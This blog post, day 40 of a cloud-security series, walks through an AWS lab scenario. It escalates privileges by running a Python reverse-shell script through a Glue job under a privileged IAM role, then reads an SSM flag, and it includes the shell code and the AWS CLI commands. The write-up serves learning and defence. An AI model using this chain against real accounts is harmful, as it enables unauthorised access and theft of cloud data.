---
title: '100 Days of Cloud Security - Day 40: Attack — `Glue_privesc` - Part 2'
date: '2025-12-19'
author: 'Venkata Pathuri'
excerpt: 'Day 40 of my cloud security journey - Attack — `Glue_privesc` - Part 2'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 40: Attack — `Glue_privesc` - Part 2

## Overview
Welcome back to Day 40 of our cloud security journey! Today, we continue exploring privilege escalation tactics within AWS, specifically focusing on leveraging the Glue service for our advantage. Building on our previous learning in Day 39, where we initiated our exploration of the `Glue_privesc` scenario, we’ll now delve deeper into exploitation techniques that can lead to obtaining sensitive data and escalating privileges.

## Learning Objectives
By the end of today’s session, you’ll master the art of privilege escalation in AWS using Glue jobs. You will learn how to identify vulnerable roles, inject malicious scripts, and retrieve hidden data from the SSM Parameter Store. This hands-on exploration will not only solidify your understanding of AWS IAM policies but also demonstrate the critical importance of secure coding practices and diligent permissions management.

## Deep Dive
### Understanding the Glue Service
AWS Glue is a fully managed data integration service that simplifies the process of preparing data for analytics. With Glue, you can create ETL (Extract, Transform, Load) jobs that seamlessly move and transform data between various sources. In our case, we are utilizing Glue to execute a Python script that can help us escalate privileges.

### Step-by-Step Breakdown of the Exploit
1. **Initial Access via Web Application**: Our journey begins with exploiting a web application that allows file uploads. By injecting SQL commands, we extracted hardcoded AWS credentials. This highlights the importance of securing user inputs to prevent SQL injection attacks.

   ![](../img/day39-01.png)

2. **User Enumeration**: Using the AWS CLI, we authenticated with the retrieved credentials and identified the active user. This step is critical for understanding what actions we can perform within the AWS account.

   ```bash
   aws sts get-caller-identity --profile cg
   ```

   ```json
   {
       "UserId": "AIDA6QRD2LZQOMDMOQLQZ",
       "Account": "997581282912",
       "Arn": "arn:aws:iam::997581282912:user/cg-glue-admin-cgidrllyxt51v8"
   }
   ```

3. **Permission Enumeration**: Next, we examined the policies attached to our user, revealing that we could create Glue jobs and pass IAM roles. This capability is the crux of our privilege escalation approach.

   ```bash
   aws iam list-user-policies --user-name cg-glue-admin-cgidrllyxt51v8 --profile cg
   ```

4. **Role Discovery**: With the ability to create jobs, we identified available IAM roles in the account. We looked for roles with elevated permissions that our user could leverage.

   ```bash
   aws iam list-roles --profile cg
   ```

5. **Analyzing Target Role Permissions**: We examined the `s3_to_gluecatalog_lambda_role` to assess its permissions. This role grants full access to S3, which is a significant escalation opportunity.

   ```bash
   aws iam list-attached-role-policies --role-name s3_to_gluecatalog_lambda_role --profile cg
   ```

6. **Preparation for Exploitation**: We prepared a malicious Python script (`shell.py`) designed to create a reverse shell. This script would allow us to execute commands remotely once triggered.

   ```python
   import socket
   import subprocess

   # Attacker IP
   HOST = "192.168.1.56"  # Replace with your actual IP
   PORT = 6666

   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((HOST, PORT))
   s.send(b"Connection established")

   while True:
       command = s.recv(1024).decode("utf-8")
       if command.lower() == "exit":
           break
       output = subprocess.getoutput(command)
       s.send(output.encode("utf-8"))
   s.close()
   ```

7. **Exploitation (Privilege Escalation)**: We then created a Glue job that uses the compromised role and pointed to our malicious script in S3. Triggering this job effectively executes our reverse shell with elevated permissions.

   ```bash
   aws glue create-job \
       --name shell \
       --role arn:aws:iam::997581282912:role/s3_to_gluecatalog_lambda_role \
       --command '{"Name":"pythonshell", "PythonVersion": "3", "ScriptLocation":"s3://cg-web-cgidrllyxt51v8/shell.py"}' \
       --profile cg
   ```

8. **Post-Exploitation & Flag Retrieval**: Once the job executed, the reverse shell connected back to our listener. From there, we could retrieve sensitive information, such as flags stored in the SSM Parameter Store.

   ```bash
   aws ssm get-parameter --name flag
   ```

   ```json
   {
       "Parameter": {
           "Name": "flag",
           "Value": "flag{Best-of-the-Best-12th-CGV}"
       }
   }
   ```

## Hands-On Practice
### Practical Steps
1. **Set up**: Use the AWS CLI with your credentials (replace `EXAMPLE` with your actual credentials when testing).

2. **Execute Commands**: Follow the commands outlined above to replicate the steps, ensuring you understand each action's purpose.

3. **Verify Success**: After executing the Glue job, confirm the reverse shell connection and check for the expected output.

### Common Troubleshooting Tips
- **Permissions Errors**: If you encounter permission errors, double-check the policies attached to your IAM user and roles.
- **Network Issues**: Ensure your listener (e.g., netcat) is running and accessible from your environment.
- **Script Errors**: Validate your Python script for syntax or logical errors before uploading it to S3.

## Key Takeaways
Today’s exploration of privilege escalation via AWS Glue highlighted the critical nature of permission management within cloud environments. By understanding how to leverage IAM roles and Glue jobs, we gained insights into potential vulnerabilities that can be exploited if not properly secured. 

The knowledge acquired today emphasizes the importance of safeguarding sensitive information and continuously monitoring for security weaknesses in cloud applications.

## Real-World Applications
In production environments, understanding these tactics is crucial for security professionals. Organizations must implement robust IAM policies and continuously audit permissions to mitigate risks. Regular penetration testing can also help expose vulnerabilities, ensuring that cloud resources are adequately protected against malicious actors.

---
**Journey Progress:** 40/100 Days Complete 🚀